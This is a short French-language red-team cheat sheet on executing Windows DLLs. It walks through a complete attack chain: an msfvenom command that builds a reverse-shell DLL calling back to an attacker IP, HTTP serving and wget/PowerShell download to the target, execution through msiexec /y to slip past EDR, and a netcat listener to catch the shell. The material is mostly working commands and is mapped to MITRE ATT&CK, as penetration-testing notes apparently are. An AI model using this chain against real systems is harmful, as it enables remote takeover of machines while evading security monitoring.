# Techniques d'exécution des DLL Windows

Les bibliothèques de liens dynamiques (DLL) sont des modules de code partagés sous Microsoft Windows, pouvant être chargés et exécutés à l'exécution par les processus hôtes. Du fait de leur intégration profonde au système d'exploitation Windows, les attaquants et les équipes d'attaque exploitent ce mécanisme pour exécuter du code arbitraire tout en contournant les outils de détection et de réponse aux incidents (EDR).

## Création de charge utile avec MSFvenom

L'utilitaire msfvenom de Metasploit génère du shellcode brut et l'encapsule dans différents formats de sortie. La commande ci-dessous crée un shell TCP inversé 64 bits pour Windows, encapsulé dans une DLL.

### Commande msfvenom

```bash
msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.1.17 lport=1234 -f dll > shell.dll
```

## Téléchargement de la dll sur la cible

## Attack Box

Créer un serveur pour servir la dll

### Python serveur HTTP

```bash
python -m http.server <port>
```

## Target Box

Récupération de la dll

### Wget

```powershell
 wget http://<ATTACKBOX_IP>:<PORT>/shell.dll -o shell.dll
```

### Powershell

```powershell
 iwr -UseBasicParsing http://<ATTACKBOX_IP>:<PORT>/shell.dll -OutFile shell.dll
```

## Explication détaillée de la technique

### **Msiexec**

Le service Windows Installer (msiexec.exe) possède un indicateur /y non documenté qui appelle l'exportation DllRegisterServer d'une DLL donnée, identique à ce que fait regsvr32, mais via un binaire différent et moins surveillé.

## Exécution

```powershell
 msiexec /y C:\users\public\shell.dll
```

### **Configuration de l'écouteur**

Avant toute exécution, un écouteur doit être en cours d'exécution sur la machine de l'attaquant. L'utilitaire rlwrap encapsule netcat pour fournir la prise en charge de readline (historique, touches fléchées).

```bash
 rlwrap nc -lvnp 1234
```

Fonctionnement : msiexec est un binaire signé Microsoft utilisé légitimement pour l’installation de logiciels. L’option /y active l’auto-enregistrement de la DLL, chargeant celle-ci dans le processus msiexec et déclenchant l’exécution de code shell. De nombreux produits de sécurité autorisent msiexec par défaut.

**MITRE ATT&CK** : T1218.007 - Exécution de proxy binaire signé : Msiexec